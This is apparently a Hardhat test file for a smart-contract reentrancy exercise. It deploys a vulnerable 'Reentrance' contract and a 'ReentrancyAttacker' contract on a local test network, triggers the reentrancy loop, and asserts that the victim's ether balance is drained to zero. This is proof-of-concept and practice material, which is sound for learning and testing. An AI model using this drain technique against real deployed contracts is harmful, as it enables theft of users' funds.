const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Reentrancy", function () {
  it("Should drain the ether", async function () {
    const [deployer, eoa] = await ethers.getSigners()

    const Contract = await ethers.getContractFactory("Reentrance")
    const contract = await Contract.deploy()

    // Fund the contract
    await deployer.sendTransaction({
      to: contract.address,
      from: deployer.address,
      value: ethers.utils.parseEther('0.01')
    })


    const Attacker = await ethers.getContractFactory("ReentrancyAttacker")
    const attacker = await Attacker.deploy(contract.address)


    // Fund contract on behalf of attack
    await contract.connect(eoa).donate(attacker.address, { value: ethers.utils.parseEther('0.03')})

    // Call execute to start reentrance loop
    await attacker.connect(eoa).execute()

    // Make sure balance of contract is 0
    const balance = await contract.provider.getBalance(contract.address)

    expect(balance.toString()).to.equal('0')


    
  });
});
